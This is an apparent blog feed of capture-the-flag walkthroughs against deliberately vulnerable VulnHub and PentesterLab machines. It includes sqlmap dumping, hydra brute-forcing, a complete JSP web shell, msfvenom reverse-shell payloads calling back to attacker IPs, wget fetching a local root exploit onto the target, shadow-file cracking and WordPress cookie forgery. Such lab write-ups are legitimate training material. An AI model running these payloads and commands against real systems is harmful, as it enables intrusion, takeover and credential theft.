    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>Burp</li>
<li>Sqlmap</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/vulnjson/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.175 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.175 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/vulnjson/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Use wfuzz to burte force hidden path of the server</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.175/FUZZ 2&gt;/dev/null
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/vulnjson/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like /bin is a hidden path. Lets check it.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/vulnjson/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Sqlmap tips</p>

<p>from <a href="https://vimeo.com/96799028">Marudhamaran Gunasekaran</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>How do I test a log in protected website with sqlmap?
</span><span class='line'>use the --cookie parameter / or capture the request, pass it on with the -r parameter / or use the --auth-type=ATYPE, --auth-cred=ACRED, and --auth-cert=ACERT parameters
</span><span class='line'>How do I test a website with sqlmap that requires authentication?
</span><span class='line'>use the --cookie parameter / or capture the request, pass it on with the -r parameter / or use the --auth-type=ATYPE, --auth-cred=ACRED, and --auth-cert=ACERT parameters
</span><span class='line'>How do I test a website with sqlmap that uses JSON data?
</span><span class='line'>automatically works with JSON
</span><span class='line'>How do I test a website with sqlmap that uses XML data?
</span><span class='line'>use the custom injection paramter pointer *
</span><span class='line'>How do I test a website with sqlmap that uses SSL?
</span><span class='line'>use the --force-ssl parameter
</span><span class='line'>How do I tell sqlmap to try harder?
</span><span class='line'>use the --level and --risk parameters
</span><span class='line'>How do I automate a sql map scan?
</span><span class='line'>use the --batch and --crawl 3</span></code></pre></td></tr></table></div></figure>


<p>go to the <a href="http://192.168.79.175,">http://192.168.79.175,</a> then search the users and use burp to record the traffic.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/vulnjson/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Then click the traffic content in the burp and right click it and copy to file, name it as test.txt.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/vulnjson/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>Then in the terminal, we try:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -r test.txt  --level 5 --risk 3 --threads 10 -p "username" --dump</span></code></pre></td></tr></table></div></figure>


<p>since there is a parameter username in the post request, so we use that as a parameter for sqlmap</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/vulnjson/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Now the sqlmap dump all items I created.</p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[vulhub:kevgir1]]></title>
    <link href="http://wg135.github.io/blog/2016/05/02/vulhub-kevgir1/"/>
    <updated>2016-05-02T14:42:52-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/02/vulhub-kevgir1</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/kevgir-1,137/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>hydra</li>
<li>msfvenom</li>
<li>joomscan</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.174 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.174 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Let attack ftp now.</p>

<p><code>hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt  -u  -s 25 192.168.79.174 ftp</code></p>

<p>get the user name and password</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>try ssh using same username and password</p>

<p><code>ssh -p 1322 admin@192.168.79.174</code></p>

<p>FTP attack DONE</p>

<p>Now it is privilege escalation time</p>

<p><code>uname -a</code>, get the result:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit 14.04</code>
<img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>try <code>/linux/local/37292.c</code>, copy it to /var/www/html/, use wget to download to target machine, then compile it.</p>

<p><code>gcc 37292.c -o attack -static</code>, then run <code>attack</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>failed, now try harder.</p>

<p>In the searchsploit result, there is a 39166.c. Lets try this one.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>GET the ROOT!!</p>

<p>Now let&rsquo;s attack port 8080. Use nikto to scan it first.</p>

<p><code>nikto -h 192.168.79.174:8080</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>We got the username and password for tomcat manager &hellip; good</p>

<p>log into the manager page and now we can upload webshell&hellip;.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>create webshell(from pentester lab, you may generate it using msfvenom)</p>

<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">FORM</span> <span class="nx">METHOD</span><span class="o">=</span><span class="nx">GET</span> <span class="nx">ACTION</span><span class="o">=</span><span class="s1">&#39;index.jsp&#39;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">INPUT</span> <span class="nx">name</span><span class="o">=</span><span class="s1">&#39;cmd&#39;</span> <span class="nx">type</span><span class="o">=</span><span class="nx">text</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">INPUT</span> <span class="nx">type</span><span class="o">=</span><span class="nx">submit</span> <span class="nx">value</span><span class="o">=</span><span class="s1">&#39;Run&#39;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">FORM</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;%@</span> <span class="nx">page</span> <span class="nx">import</span><span class="o">=</span><span class="s2">&quot;java.io.*&quot;</span> <span class="o">%&gt;</span>
</span><span class='line'><span class="o">&lt;%</span>
</span><span class='line'>   <span class="nx">String</span> <span class="nx">cmd</span> <span class="o">=</span> <span class="nx">request</span><span class="o">.</span><span class="nx">getParameter</span><span class="p">(</span><span class="s2">&quot;cmd&quot;</span><span class="p">);</span>
</span><span class='line'>   <span class="nx">String</span> <span class="nx">output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="k">if</span><span class="p">(</span><span class="nx">cmd</span> <span class="o">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">String</span> <span class="nx">s</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span><span class='line'>      <span class="k">try</span> <span class="p">{</span>
</span><span class='line'>         <span class="nx">Process</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">Runtime</span><span class="o">.</span><span class="nx">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="nb">exec</span><span class="p">(</span><span class="nx">cmd</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">);</span>
</span><span class='line'>         <span class="nx">BufferedReader</span> <span class="nx">sI</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BufferedReader</span><span class="p">(</span><span class="k">new</span> <span class="nx">InputStreamReader</span><span class="p">(</span><span class="nx">p</span><span class="o">.</span><span class="nx">getInputStream</span><span class="p">()));</span>
</span><span class='line'>         <span class="k">while</span><span class="p">((</span><span class="nx">s</span> <span class="o">=</span> <span class="nx">sI</span><span class="o">.</span><span class="nx">readLine</span><span class="p">())</span> <span class="o">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span> <span class="nx">output</span> <span class="o">+=</span> <span class="nx">s</span><span class="o">+</span><span class="s2">&quot;&lt;/br&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>  <span class="k">catch</span><span class="p">(</span><span class="nx">IOException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>   <span class="nx">e</span><span class="o">.</span><span class="nx">printStackTrace</span><span class="p">();</span>   <span class="p">}</span>
</span><span class='line'>   <span class="p">}</span>
</span><span class='line'><span class="o">%&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;%=</span><span class="nx">output</span> <span class="o">%&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>now pack the webshell</p>

<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nb">mkdir</span> <span class="nx">webshell</span>
</span><span class='line'><span class="nx">cp</span> <span class="nx">index</span><span class="o">.</span><span class="nx">jsp</span> <span class="nx">webshell</span>
</span><span class='line'>
</span><span class='line'><span class="nx">cd</span> <span class="nx">webshell</span>
</span><span class='line'><span class="nx">jar</span> <span class="o">-</span><span class="nx">cvf</span> <span class="o">../</span><span class="nx">webshell</span><span class="o">.</span><span class="nx">war</span> <span class="o">*</span>
</span></code></pre></td></tr></table></div></figure>


<p>now upload the webshell.war. After uploading, visit page  <code>192.168.79.174:8080/webshell/</code>.</p>

<p>get the shell</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Lets use msfvenom to create webshell</p>

<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.79.173 LPORT=4444 -f war &gt; webshell1.war</code></p>

<p>upload webshell1.war and setup netcat listening on port 4444. After connection is setup. do <code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>get the shell</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE for Tomcat</p>

<p>Now move to port 8081</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>Its Joomla!.</p>

<p>use tool <code>joomscan</code> to scan it</p>

<p><code>joomscan -u http://192.168.79.174:8081</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>get the version of joomla!</p>

<p>Now find out the vulnerability:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>follow the instructions of this vulnerability.</p>

<p>login as admin:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>create php reverse shell:</p>

<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.173 LPORT=6666 -e php/base64 -f raw &gt; shell.php</code></p>

<p>In Extension ->Template Manager, edit existing template. Copy the content of the shell.php to it and don&rsquo;t forgot to add &lt;?php and ?>.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p>set up the netcat and preview the page. get the shell</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>now lets try another php webshell</p>

<p><a href="https://github.com/wg135/webshell-1/blob/master/php/reverseshell-poc.txt">reverse shell from hacksys team</a></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/gameover.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SecTalks: BNE0x00 - Minotaur]]></title>
    <link href="http://wg135.github.io/blog/2016/04/26/sectalks-bne0x00-minotaur/"/>
    <updated>2016-04-26T13:27:14-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/26/sectalks-bne0x00-minotaur</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/">Vulhub</a></p>

<h3>Forces:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>WPscan</li>
<li>msfvenom</li>
<li>John the Ripper</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.56.223 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.56.223 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 22, 80 and 2020 are opening.</p>

<p>use wfuzz to find more locations</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.223/FUZZ 2&gt;/dev/null</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>found <a href="http://192.168.56.223/bull/">http://192.168.56.223/bull/</a></p>

<p>Check the page, looks like it uses wordpress. Good. maybe I can find out some outdated wordpress plugins.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>I use wpscan to find wordpress plugins vulnerabilities.</p>

<p><code>uby wpscan.rb --url http://192.168.56.223/bull/</code></p>

<p>get some xss vulnerabilities and an interestig arbutrart file upload vulnerability.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>next step, user enumeration.</p>

<p><code>ruby wpscan.rb --url http://192.168.56.223/bull/ --enumerate u</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>get a user name <code>bully</code></p>

<p>next step, password guessing:</p>

<p><code>ruby wpscan.rb --url http://192.168.56.223/bull/ --wordlist SecLists/Passwords/passwords_john.txt threads 50</code></p>

<p>no luck this time. Let&rsquo;s try harder..</p>

<p>we use cewl this time to generate password file</p>

<p><code>cewl -w password.txt http://192.168.56.223/bull/</code></p>

<p>also john the ripper should be used to mutate the password file:</p>

<p><code>john --wordlist=password.txt --rules --stdout &gt; out.txt</code></p>

<p>now I use wpscan to brute force the password:</p>

<p><code>wpscan --url 192.168.56.223/bull --wordlist out.txt --username bully</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Now, create php reverse shell:</p>

<p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.223 -a php --platform php -o evil.php</code></p>

<p>based one wpscan scan result, the wordpress slideshow gallery shell upload exploit(<a href="https://www.exploit-db.com/exploits/34681/">https://www.exploit-db.com/exploits/34681/</a>) is found. Save it as <code>wp_gallery.py</code></p>

<p>run:</p>

<p><code>python wp_gallery.py -t http://192.168.56.223/bull -u bully -p Bighornedbulls -f evil.php</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>set netcat
<code>nc -nlvp 1234</code></p>

<p>visit <code>http://192.168.56.223/bull/wp-content/uploads/slideshow-gallery/evil.php</code></p>

<p>get the meterpreter</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>locate flag.txt and get the result <code>/tmp/flag.txt</code></p>

<p>find a file shadow.bak in /tmp, I got some interesting things:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like there are more chances to me. Download this file and use john to crack more.</p>

<p><code>john --fork=4 shadow.bak</code></p>

<p>now I have two more accounts info</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>use python <code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>Login as heffer:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>Login as minotaur:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/bne03/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[TestLab--V.8]]></title>
    <link href="http://wg135.github.io/blog/2016/04/25/testlab-v-dot-8/"/>
    <updated>2016-04-25T13:13:31-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/25/testlab-v-dot-8</id>
    <content type="html"><![CDATA[<p><em>Night is falling</em> &mdash;- Lord of the rings</p>

<!--more-->


<p>Network diagram, from <a href="https://lab.pentestit.ru/pentestlabs/4">pentestit</a></p>

<p><img src="http://wg135.github.io/images/blog/pentestit/v8/TL8_map.png" title="[title manually exploit [alt text]]" ></p>

<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>Burp Suite</li>
<li>Metasploit</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SecTalks: BNE0x03 - Simple]]></title>
    <link href="http://wg135.github.io/blog/2016/04/20/sectalks-bne0x03-simple/"/>
    <updated>2016-04-20T13:49:22-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/20/sectalks-bne0x03-simple</id>
    <content type="html"><![CDATA[<p><em>May the LORD, my rock, be praised, who trains my hands for battle and my fingers for warfare.</em> &mdash;- Psalm 144:1</p>

<p>From <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">Vulhub</a>
Simple CTF is a boot2root that focuses on the basics of web based hacking. Once you load the VM, treat it as a machine you can see on the network, i.e. you don&rsquo;t have physical access to this machine. Therefore, tricks like editing the VM&rsquo;s BIOS or Grub configuration are not allowed. Only remote attacks are permitted. /root/flag.txt is your ultimate goal.</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Burp Suite</li>
<li>Metasploit</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
<li>Search the web app vulnerability  &mdash; searchsploit</li>
<li>Generate and upload webshell  &mdash;metasploit</li>
<li>Get root</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.172 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.172 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Only port 80 is opening. Lets use Iceweasel to view the page.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>I noticed that the web app is Cutenews 2.0.3. search the exploit:</p>

<p><code>searchsploit cutenews</code></p>

<p>find the interesting results:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>The exploit is as follow:</p>

<ul>
<li>Sign up for New User</li>
<li>Log In</li>
<li>Go to Personal options <a href="http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal">http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal</a></li>
<li>Select Upload Avatar Example: Evil.jpg</li>
<li>use tamper data  &amp; Rename File Evil.jpg to Evil.php</li>
</ul>


<p>Okay, firstly, I creat a reverse php shell,</p>

<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.156 LPORT=1234 -a php --platform php -o evil.jpg</code></p>

<p>Now, use Burp as proxy, go to Personal options <a href="http://192.168.79.172/cutenews/index.php?mod=main&amp;opt=personal">http://192.168.79.172/cutenews/index.php?mod=main&amp;opt=personal</a> to upload evil.jpg</p>

<p>in the burp, change the evil.jgp to evil.php</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>After that, Burp will recevied a GET request:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>set metasploit multi/handler.</p>

<p>now go to <a href="http://192.168.79.172/uploads/avatar_bob1bob2.php">http://192.168.79.172/uploads/avatar_bob1bob2.php</a> will get meterpreter reverse shell:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>However, I am not the root, search the os version:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>search the ubuntu 14.04</p>

<p><code>searchsploit ubuntu 14.04</code> and we get the result:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Move the file to /var/www/html/ and in reverse shell:</p>

<p><code>wget http://192.168.79.156/37292.c -O hack.c</code></p>

<p>compile it:</p>

<p><code>gcc hack.c -o hack -static</code>, run it.</p>

<p>then use <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> to get the shell.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/simple_ctf1/last.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2008-1930 Wordpress 2.5 Cookie Integrity Protection Vulnerability]]></title>
    <link href="http://wg135.github.io/blog/2016/04/18/cve-2008-1930/"/>
    <updated>2016-04-18T16:53:35-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/18/cve-2008-1930</id>
    <content type="html"><![CDATA[<p><em>Wake up..Neo.. The Matrix HAS YOU</em> &mdash;&ndash;the Matrix</p>

<p>From <a href="https://pentesterlab.com/exercises/cve-2008-1930/course">pentesterlab</a>
This course details the exploitation of an issue in the cookies integrity mechanism of Wordpress. This issue was found in 2008 and allowed an attacker to gain administrator access to a wordpress instance if user registration is enabled.</p>

<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Cookie Manager+</li>
<li>wfuzz</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Use wfuzz to burte force hidden path of the server</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2008_1930/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>next step, we use admin1 and password pentesterlab to login as user admin1</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2008_1930/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2008_1930/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>here we can use Cookie Manager+ to view the cookies we got.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2008_1930/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>modify cookie from <code>admin1%7C1461188835%7Ce6cf864114aa5acaae0795ff56b333b0</code> to <code>admin%7C11461188835%7Ce6cf864114aa5acaae0795ff56b333b0</code>, reload the page, now we are in admin&rsquo;s session.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2008_1930/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--Xss and MySQL FILE]]></title>
    <link href="http://wg135.github.io/blog/2016/04/12/pentesterlab-xss-and-mysql-file/"/>
    <updated>2016-04-12T13:19:35-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/12/pentesterlab-xss-and-mysql-file</id>
    <content type="html"><![CDATA[<p><em>It is time for you to act, LORD; your law is being broken.</em> &mdash; Psalm 119:126</p>

<p>This course details the exploitation of a Cross-Site Scripting in a PHP based website and how an attacker can use it to gain access to the administration pages. Then, using this access, the attacker will be able to gain code execution on the server using SQL injections.</p>

<p>From Pentesterlab:</p>

<p>The attack is divided into 2 steps:</p>

<ol>
<li>Detection and exploitation of Cross-Site Scripting vulnerabilities: in this part, you will learn how to detect and exploit Cross-Site Scripting vulnerabilities.</li>
<li>Access to the administration pages, then find and exploit a SQL injection to gain code execution. The last step in which you will access the operating system and run command.</li>
</ol>


<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>wfuzz</li>
<li>Zap</li>
<li>Firebug</li>
<li>Cookie Manager+</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
<li>Burte force hidden path of the server. &mdash;-wfuzz</li>
<li>Indetify XSS vuln and scan the website pages. &mdash;-Zap</li>
<li>Embeded script into page. &mdash;- Firebug</li>
<li>Deploy web shell.</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><code>nmap -sV -v -A 192.168.79.168</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>Use wfuzz to burte force hidden path of the server</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Also I lauched zap to scan the website, try to find interesting things such as injection points and hidden pages. two things are very interesting. First of all, zap raises a flag for a xss vulnerability:</p>

